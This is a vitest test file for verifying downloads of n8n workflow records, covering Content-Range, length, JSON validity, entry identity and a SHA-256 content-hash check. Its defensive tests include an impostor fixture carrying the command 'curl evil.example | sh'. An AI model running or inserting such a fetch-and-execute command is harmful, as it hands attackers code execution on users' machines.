import { createHash } from 'node:crypto';
import { describe, expect, it } from 'vitest';
import type { Entry } from '@hub/contracts';
import { makeEntry } from '../test-support/make-entry';
import { parseEntryArtifact } from '@hub/contracts/entry-artifact';
import type { DownloadSpec } from './download';
import {
  DownloadVerificationError,
  MAX_RECORD_BYTES,
  verifyRangeResponse,
  verifySlicedResponse,
} from './download-verify';
import { verifyContentHash } from './download-content-hash';

function workflowJsonText(nodeTypes: string[]): string {
  return JSON.stringify({
    name: 'Test workflow',
    nodes: nodeTypes.map((type, i) => ({
      id: String(i), name: `Node ${i}`, type, typeVersion: 1, position: [i * 100, 0], parameters: {},
    })),
    connections: {},
  });
}

function padToBytes(text: string, targetBytes: number): string {
  const currentBytes = new TextEncoder().encode(text).byteLength;
  if (currentBytes > targetBytes) throw new Error(`fixture text already exceeds ${targetBytes} bytes`);
  return text + ' '.repeat(targetBytes - currentBytes);
}

const NODE_TYPES = ['n8n-nodes-base.manualTrigger', 'n8n-nodes-base.set'];
const VALID_TEXT = workflowJsonText(NODE_TYPES);
const sha256Hex = (bytes: Uint8Array) => createHash('sha256').update(bytes).digest('hex');
const VALID_BYTES = new TextEncoder().encode(VALID_TEXT);
const PACKED_BYTES = new TextEncoder().encode(`${VALID_TEXT}\n`);

function makeSpec(overrides: Partial<DownloadSpec> = {}): DownloadSpec {
  return {
    packPath: 'packs/pack-0.jsonl',
    line: 0,
    offset: 0,
    length: PACKED_BYTES.byteLength,
    totalSize: PACKED_BYTES.byteLength,
    ...overrides,
  };
}

function makeWorkflowEntry(structureOverrides: Partial<Entry['structure']> = {}): Entry {
  return makeEntry({
    id: 'entry-1',
    slug: 'entry-1',
    structure: {
      nodeCount: 2, rawNodeCount: 2, connectionCount: 0, nodeTypes: NODE_TYPES, integrations: [], trigger: '',
      complexity: 'simple', hasCode: false, hasAI: false, hasWebhook: false,
      ...structureOverrides,
    } as Entry['structure'],
    download: { pack: 0, line: 0, offset: 0, length: PACKED_BYTES.byteLength },
  });
}

function expectedContentRange(spec: DownloadSpec): string {
  return `bytes ${spec.offset}-${spec.offset + spec.length - 1}/${spec.totalSize}`;
}

function codeOf(fn: () => unknown): string | undefined {
  try {
    fn();
    return undefined;
  } catch (err) {
    expect(err).toBeInstanceOf(DownloadVerificationError);
    return (err as DownloadVerificationError).code;
  }
}

describe('verifyRangeResponse', () => {
  it('accepts a correct 206: matching Content-Range, exact length, single record, matching entry', () => {
    const spec = makeSpec();
    const entry = makeWorkflowEntry();
    expect(verifyRangeResponse(PACKED_BYTES, spec, entry, expectedContentRange(spec))).toBe(VALID_TEXT);
  });

  it('rejects a valid JSON record missing its canonical trailing JSONL LF without a hash', () => {
    const spec = makeSpec({ length: VALID_BYTES.byteLength, totalSize: VALID_BYTES.byteLength });
    const entry = makeWorkflowEntry();
    expect(codeOf(() => verifyRangeResponse(VALID_BYTES, spec, entry, expectedContentRange(spec))))
      .toBe('JSONL_NEWLINE_MISSING');
  });

  it('rejects a Content-Range that does not match the requested range', () => {
    const spec = makeSpec();
    const entry = makeWorkflowEntry();
    expect(codeOf(() => verifyRangeResponse(VALID_BYTES, spec, entry, 'bytes 9000-9999/20000')))
      .toBe('CONTENT_RANGE_MISMATCH');
  });

  it('rejects a missing Content-Range header', () => {
    const spec = makeSpec();
    const entry = makeWorkflowEntry();
    expect(codeOf(() => verifyRangeResponse(VALID_BYTES, spec, entry, null))).toBe('CONTENT_RANGE_MISSING');
  });

  it('rejects a truncated body even with a Content-Range that describes the full range', () => {
    const spec = makeSpec();
    const entry = makeWorkflowEntry();
    const truncated = PACKED_BYTES.slice(0, PACKED_BYTES.byteLength - 10);
    expect(codeOf(() => verifyRangeResponse(truncated, spec, entry, expectedContentRange(spec))))
      .toBe('BODY_LENGTH_MISMATCH');
  });

  it('rejects an overlong body even with a Content-Range that describes the full range', () => {
    const spec = makeSpec();
    const entry = makeWorkflowEntry();
    const overlong = new Uint8Array(PACKED_BYTES.byteLength + 50).fill(0x20);
    overlong.set(PACKED_BYTES, 0);
    expect(codeOf(() => verifyRangeResponse(overlong, spec, entry, expectedContentRange(spec))))
      .toBe('BODY_LENGTH_MISMATCH');
  });

  it('rejects a body over the hard byte-size bound before parsing it', () => {
    const oversized = new Uint8Array(MAX_RECORD_BYTES + 1).fill(0x20);
    const spec = makeSpec({ length: oversized.byteLength, totalSize: oversized.byteLength });
    const entry = makeWorkflowEntry();
    expect(codeOf(() => verifyRangeResponse(oversized, spec, entry, expectedContentRange(spec))))
      .toBe('BODY_TOO_LARGE');
  });

  it('rejects an empty body', () => {
    const blank = new TextEncoder().encode('   ');
    const spec = makeSpec({ length: blank.byteLength, totalSize: blank.byteLength });
    const entry = makeWorkflowEntry();
    expect(codeOf(() => verifyRangeResponse(blank, spec, entry, expectedContentRange(spec)))).toBe('EMPTY_BODY');
  });

  it('rejects a body containing more than one record', () => {
    const combinedText = `${VALID_TEXT}\n${VALID_TEXT}\n`;
    const combinedBytes = new TextEncoder().encode(combinedText);
    const spec = makeSpec({ length: combinedBytes.byteLength, totalSize: combinedBytes.byteLength });
    const entry = makeWorkflowEntry();
    expect(codeOf(() => verifyRangeResponse(combinedBytes, spec, entry, expectedContentRange(spec))))
      .toBe('MULTI_RECORD_BODY');
  });

  it('rejects a malformed-JSON body of the correct length', () => {
    const malformedText = padToBytes('{not valid json', PACKED_BYTES.byteLength);
    const malformedBytes = new TextEncoder().encode(malformedText);
    const spec = makeSpec();
    const entry = makeWorkflowEntry();
    expect(codeOf(() => verifyRangeResponse(malformedBytes, spec, entry, expectedContentRange(spec))))
      .toBe('MALFORMED_JSON');
  });

  it('AUDIT-DL-001 headline case: rejects a well-formed record for a different entry', () => {
    // Same byte length, single record, valid JSON, correct Content-Range — the
    // only thing wrong is that this is not the workflow the caller asked for
    // (a different node count).
    const differentWorkflowText = `${padToBytes(workflowJsonText(['n8n-nodes-base.if']), PACKED_BYTES.byteLength - 1)}\n`;
    const differentBytes = new TextEncoder().encode(differentWorkflowText);
    expect(differentBytes.byteLength).toBe(PACKED_BYTES.byteLength);
    const spec = makeSpec();
    const entry = makeWorkflowEntry();
    expect(codeOf(() => verifyRangeResponse(differentBytes, spec, entry, expectedContentRange(spec))))
      .toBe('IDENTITY_MISMATCH');
  });

  it('rejects a same-length, same-node-count body that is missing a declared node type', () => {
    const wrongTypesText = padToBytes(
      workflowJsonText(['n8n-nodes-base.webhook', 'n8n-nodes-base.slack']),
      PACKED_BYTES.byteLength - 1,
    );
    const wrongTypesBytes = new TextEncoder().encode(`${wrongTypesText}\n`);
    const spec = makeSpec();
    const entry = makeWorkflowEntry();
    expect(codeOf(() => verifyRangeResponse(wrongTypesBytes, spec, entry, expectedContentRange(spec))))
      .toBe('IDENTITY_MISMATCH');
  });
});

describe('verifySlicedResponse (200 that ignored Range)', () => {
  it('accepts a correctly sliced record', () => {
    const spec = makeSpec();
    const entry = makeWorkflowEntry();
    expect(verifySlicedResponse(PACKED_BYTES, spec, entry)).toBe(VALID_TEXT);
  });

  it('rejects a valid JSON record missing its canonical trailing JSONL LF without a hash', () => {
    const spec = makeSpec({ length: VALID_BYTES.byteLength, totalSize: VALID_BYTES.byteLength });
    const entry = makeWorkflowEntry();
    expect(codeOf(() => verifySlicedResponse(VALID_BYTES, spec, entry))).toBe('JSONL_NEWLINE_MISSING');
  });

  it('rejects a slice shorter than the manifest-declared length (source shorter than expected)', () => {
    const spec = makeSpec({ length: VALID_BYTES.byteLength + 100, totalSize: VALID_BYTES.byteLength + 100 });
    const entry = makeWorkflowEntry();
    expect(codeOf(() => verifySlicedResponse(VALID_BYTES, spec, entry))).toBe('BODY_LENGTH_MISMATCH');
  });
});

/**
 * I2 / AUDIT-DL-001. The identity check was a SHAPE check: same rawNodeCount and
 * same node-type set passed. The R1 reviewer built a workflow matching a real
 * entry's shape but carrying a hostile `curl ... | sh` payload, and it verified
 * cleanly — downloading under the real entry's filename and licence notice.
 *
 * `EntryDownload` now carries the packed line's `sha256`, exactly as
 * `write-detail-artifacts.ts` already does for detail artifacts. When present it
 * is authoritative: a body whose bytes do not hash to it is rejected regardless
 * of how convincingly it mimics the entry's shape.
 *
 * It stays optional so a corpus packaged before this field existed still
 * downloads — those entries fall back to the shape check and are no worse off
 * than before. Once the corpus is repackaged the check becomes cryptographic.
 */
describe('AUDIT-DL-001: content hash beats shape mimicry', () => {
  const trueHash = sha256Hex(VALID_BYTES);

  it('accepts a body whose bytes match the packed record hash', async () => {
    await expect(verifyContentHash(VALID_TEXT, trueHash)).resolves.toBeUndefined();
  });

  it('rejects a same-shape body whose bytes hash differently', async () => {
    // Same node count, same node types — passes every structural rule — but not
    // the bytes this release packaged.
    const impostor = VALID_TEXT.replace('"parameters":{}', '"parameters":{"command":"curl evil.example | sh"}');
    const impostorBytes = new TextEncoder().encode(`${impostor}\n`);
    expect(() => verifySlicedResponse(impostorBytes, makeSpec({ length: impostorBytes.byteLength, totalSize: impostorBytes.byteLength }), makeWorkflowEntry())).not.toThrow();
    await expect(verifyContentHash(impostor, trueHash)).rejects.toMatchObject({ code: 'CONTENT_HASH_MISMATCH' });
  });

  it('falls back to the structural check when the release publishes no hash', async () => {
    await expect(verifyContentHash(VALID_TEXT, undefined)).resolves.toBeUndefined();
  });

  it('rejects a trailing newline or byte mutation because the hash covers exact JSON bytes', async () => {
    await expect(verifyContentHash(`${VALID_TEXT}\n`, trueHash)).rejects.toMatchObject({ code: 'CONTENT_HASH_MISMATCH' });
    await expect(verifyContentHash(VALID_TEXT.replace('Test workflow', 'Test workfl0w'), trueHash)).rejects.toMatchObject({ code: 'CONTENT_HASH_MISMATCH' });
  });

  it('rejects malformed hashes at the entry contract boundary', () => {
    const entry = makeEntry({ download: { pack: 0, line: 0, offset: 0, length: VALID_BYTES.byteLength, sha256: 'A'.repeat(64) } });
    expect(() => parseEntryArtifact(entry)).toThrow(/download\.sha256/);
  });

  it('preserves a lowercase 64-character hash through the test entry helper and contract parser', () => {
    const entry = makeEntry({ download: { pack: 0, line: 0, offset: 0, length: VALID_BYTES.byteLength, sha256: trueHash } });
    expect(entry.download?.sha256).toBe(trueHash);
    expect(parseEntryArtifact(entry).download?.sha256).toBe(trueHash);
  });
});
